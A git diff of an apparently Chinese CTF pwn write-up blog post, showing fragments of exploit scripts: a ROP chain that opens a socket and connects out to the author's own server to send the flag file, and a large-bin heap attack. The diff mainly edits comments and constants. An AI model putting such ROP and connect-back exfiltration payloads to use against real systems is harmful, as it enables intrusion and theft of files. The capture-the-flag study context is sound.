@@ -4,11 +4,10 @@ date: 2022-07-01 16:54:59 +0800
 categories: [ctf比赛]
 tags: [pwn, ctf]
 permalink: 
-published:
 pin: false
 ---
 
-## EDGvsDK game1(libc2.27/UAF)
+## EDGvsDK game1
 
 ```python
 # _*_ coding:utf-8 _*_
@@ -158,9 +157,9 @@ pop_rsi = 0x0000000000401357
 pop_rdx = 0x0000000000401353
 pop_rax = 0x0000000000401359
 pop_rcx = 0x000000000040135c
-# 这2个gadget题目给的,主要作用就是把rax给rdi
+# 这2个gadget主要作用就是把rax给rdi
 push_rax_pop_rcx = 0x000000000040135b#push rax ; pop rcx ; ret
-mov_rdi_rcx = 0x000000000040135e # mov rdi rcx;ret
+mov_rdi_rcx = 0x000000000040135e     # mov rdi rcx;ret
 
 
 #socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
@@ -172,7 +171,7 @@ payload += p64(1)# SOCK_STREAM
 payload += p64(pop_rdx)
 payload += p64(0)# IPPROTO_IP
 payload += p64(pop_rax)
-payload += p64(0x29)
+payload += p64(41)
 payload += p64(syscall_ret)
 #connect(soc, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in))
 payload += p64(pop_rdi)
@@ -219,12 +218,8 @@ payload += p64(syscall_ret)
 payload = payload.ljust(0x1d0,"a")
 payload += "flag\x00\x00\x00\x00"
 payload += "\x00"*8
-# 127.0.0.1 1000
-# 这里可以用
-# import socket
-# remote_ip = 127.0.0.1
-# print int(socket.inet_aton(remote_ip),16)
-#其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET
+# 例如127.0.0.1 1000   p64(1000007fe8030002)
+# 其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET
 payload += p64(0x70909e96e8030002)#改成⾃⼰的服务器的ip端⼝
 p.recv()
 p.send(payload)
@@ -326,8 +321,7 @@ edit(0,p64(main_arena)*2)
 
 dele(2)
 edit(0,p64(main_arena)*2 + p64(0) + p64(rtl_global - 0x20))
-add(0x600,'large bin attack!!')
-dbg()
+add(0x600,'e4l4')
 
 fake_heap_addr = heap_base + 0xbf0
 
